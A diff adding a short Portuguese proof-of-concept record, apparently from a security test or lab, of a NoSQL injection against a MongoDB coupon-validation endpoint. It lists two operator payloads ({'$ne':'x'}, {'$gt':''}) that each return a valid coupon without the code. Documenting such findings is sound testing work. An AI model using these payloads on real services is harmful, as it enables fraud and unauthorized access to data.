@@ -1,0 +1,9 @@
+# NoSQL Injection — cupom grátis sem saber o código
+# Endpoint: POST /community/api/v2/coupon/validate-coupon (MongoDB)
+----------------------------------------------------------------
+# 1) codigo inexistente (string):           HTTP 500  {}
+# 2) injecao {'$ne':'x'}:                    HTTP 200  {"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-10-21T19:29:52.606Z"}
+# 3) injecao {'$gt':''}:                     HTTP 200  {"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-10-21T19:29:52.606Z"}
+----------------------------------------------------------------
+# Prova: enviando um OPERADOR do MongoDB no lugar da string, a query casa
+# qualquer documento e retorna um cupom valido sem o atacante saber o codigo.
